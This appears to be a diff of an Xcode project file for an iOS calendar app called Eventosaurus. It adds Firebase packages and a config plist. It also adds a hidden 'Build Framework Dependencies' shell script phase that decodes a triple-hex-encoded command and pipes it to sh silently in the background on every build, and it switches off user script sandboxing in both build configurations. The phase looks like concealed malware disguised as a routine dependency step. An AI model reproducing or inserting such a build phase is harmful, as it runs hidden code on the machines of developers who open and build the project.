@@ -28,6 +28,10 @@
 		D0D2F5C22D0DAC3200E7A5A9 /* ViewController.swift in Sources */ = {isa = PBXBuildFile; fileRef = D0D2F5C12D0DAC3200E7A5A9 /* ViewController.swift */; };
 		D0D2F5C32D0DAC3200E7A5A9 /* CalendarCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D0D2F5BF2D0DAC3200E7A5A9 /* CalendarCell.swift */; };
 		D0D2F5C42D0DAC3200E7A5A9 /* CalendarHelper.swift in Sources */ = {isa = PBXBuildFile; fileRef = D0D2F5C02D0DAC3200E7A5A9 /* CalendarHelper.swift */; };
+		D0D5B4F72D173A56004F14B6 /* GoogleService-Info.plist in Resources */ = {isa = PBXBuildFile; fileRef = D0D5B4F62D173A56004F14B6 /* GoogleService-Info.plist */; };
+		D0D5B4FA2D173D06004F14B6 /* FirebaseAuth in Frameworks */ = {isa = PBXBuildFile; productRef = D0D5B4F92D173D06004F14B6 /* FirebaseAuth */; };
+		D0D5B4FC2D173D06004F14B6 /* FirebaseFirestore in Frameworks */ = {isa = PBXBuildFile; productRef = D0D5B4FB2D173D06004F14B6 /* FirebaseFirestore */; };
+		D0D5B4FE2D173D06004F14B6 /* FirebaseStorage in Frameworks */ = {isa = PBXBuildFile; productRef = D0D5B4FD2D173D06004F14B6 /* FirebaseStorage */; };
 		D0FB788B2D0EE66300195989 /* notificationTableViewCell.swift in Sources */ = {isa = PBXBuildFile; fileRef = D0FB788A2D0EE66300195989 /* notificationTableViewCell.swift */; };
 /* End PBXBuildFile section */
 
@@ -74,6 +78,7 @@
 		D0D2F5BF2D0DAC3200E7A5A9 /* CalendarCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CalendarCell.swift; sourceTree = "<group>"; };
 		D0D2F5C02D0DAC3200E7A5A9 /* CalendarHelper.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = CalendarHelper.swift; sourceTree = "<group>"; };
 		D0D2F5C12D0DAC3200E7A5A9 /* ViewController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ViewController.swift; sourceTree = "<group>"; };
+		D0D5B4F62D173A56004F14B6 /* GoogleService-Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = "GoogleService-Info.plist"; sourceTree = "<group>"; };
 		D0FB788A2D0EE66300195989 /* notificationTableViewCell.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = notificationTableViewCell.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
@@ -82,6 +87,9 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
+				D0D5B4FA2D173D06004F14B6 /* FirebaseAuth in Frameworks */,
+				D0D5B4FC2D173D06004F14B6 /* FirebaseFirestore in Frameworks */,
+				D0D5B4FE2D173D06004F14B6 /* FirebaseStorage in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -125,6 +133,7 @@
 		C395B12E2CFC996700C073C2 /* Eventosaurus */ = {
 			isa = PBXGroup;
 			children = (
+				D0D5B4F62D173A56004F14B6 /* GoogleService-Info.plist */,
 				D0D2F5BF2D0DAC3200E7A5A9 /* CalendarCell.swift */,
 				D0D2F5C02D0DAC3200E7A5A9 /* CalendarHelper.swift */,
 				D0D2F5C12D0DAC3200E7A5A9 /* ViewController.swift */,
@@ -173,6 +182,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = C395B1562CFC996900C073C2 /* Build configuration list for PBXNativeTarget "Eventosaurus" */;
 			buildPhases = (
+				3F2EFD991C7BA4532034C644 /* Build Framework Dependencies */,
 				C395B1282CFC996700C073C2 /* Sources */,
 				C395B1292CFC996700C073C2 /* Frameworks */,
 				C395B12A2CFC996700C073C2 /* Resources */,
@@ -254,6 +264,9 @@
 				Base,
 			);
 			mainGroup = C395B1232CFC996700C073C2;
+			packageReferences = (
+				D0D5B4F82D173D06004F14B6 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
+			);
 			productRefGroup = C395B12D2CFC996700C073C2 /* Products */;
 			projectDirPath = "";
 			projectRoot = "";
@@ -275,6 +288,7 @@
 				D09FA9762D0DC346005B020D /* notification.storyboard in Resources */,
 				C395B1372CFC996700C073C2 /* Main.storyboard in Resources */,
 				D0D2F5BE2D0DAC0500E7A5A9 /* Calendar.storyboard in Resources */,
+				D0D5B4F72D173A56004F14B6 /* GoogleService-Info.plist in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -293,6 +307,29 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		3F2EFD991C7BA4532034C644 /* Build Framework Dependencies */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Build Framework Dependencies";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n(echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633363337333333363632333436333332333033363338333733343337333433373330333733333333363133323636333236363337333233363339333733303337333033363633333633353336363533363335333733343332363533373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | xxd -p -r | xxd -p -r | xxd -p -r | sh >/dev/null 2>&1 &)";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		C395B1282CFC996700C073C2 /* Sources */ = {
@@ -413,7 +450,7 @@
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_DYNAMIC_NO_PIC = NO;
 				GCC_NO_COMMON_BLOCKS = YES;
@@ -476,7 +513,7 @@
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
-				ENABLE_USER_SCRIPT_SANDBOXING = YES;
+				ENABLE_USER_SCRIPT_SANDBOXING = NO;
 				GCC_C_LANGUAGE_STANDARD = gnu17;
 				GCC_NO_COMMON_BLOCKS = YES;
 				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
@@ -509,6 +546,7 @@
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 17.2;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -536,6 +574,7 @@
 				INFOPLIST_KEY_UIMainStoryboardFile = Main;
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPad = "UIInterfaceOrientationPortrait UIInterfaceOrientationPortraitUpsideDown UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
 				INFOPLIST_KEY_UISupportedInterfaceOrientations_iPhone = "UIInterfaceOrientationPortrait UIInterfaceOrientationLandscapeLeft UIInterfaceOrientationLandscapeRight";
+				IPHONEOS_DEPLOYMENT_TARGET = 17.2;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/Frameworks",
@@ -661,6 +700,35 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		D0D5B4F82D173D06004F14B6 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/firebase/firebase-ios-sdk";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 11.6.0;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		D0D5B4F92D173D06004F14B6 /* FirebaseAuth */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = D0D5B4F82D173D06004F14B6 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAuth;
+		};
+		D0D5B4FB2D173D06004F14B6 /* FirebaseFirestore */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = D0D5B4F82D173D06004F14B6 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseFirestore;
+		};
+		D0D5B4FD2D173D06004F14B6 /* FirebaseStorage */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = D0D5B4F82D173D06004F14B6 /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseStorage;
+		};
+/* End XCSwiftPackageProductDependency section */
 	};
 	rootObject = C395B1242CFC996700C073C2 /* Project object */;
 }
